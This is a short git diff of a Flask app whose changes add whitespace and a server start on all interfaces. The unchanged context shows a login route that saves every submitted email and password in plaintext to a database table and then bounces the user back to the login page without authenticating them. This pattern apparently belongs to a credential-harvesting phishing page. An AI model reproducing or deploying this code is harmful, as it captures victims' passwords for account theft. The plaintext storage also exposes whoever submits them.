@@ -5,9 +5,11 @@ db = SQL("sqlite:///fucked.db")
 
 app = Flask(__name__)
 
+
 @app.route('/')
 def index():
     return redirect('/login')
+
 
 @app.route('/login', methods=['GET', 'POST'])
 def login():
@@ -20,3 +22,7 @@ def login():
     db.execute("INSERT INTO fucked_data (email, password) VALUES(?, ?)", email, password)
 
     return redirect('/login')
+
+
+if __name__ == '__main__':
+    app.run(host="0.0.0.0", port=5000)
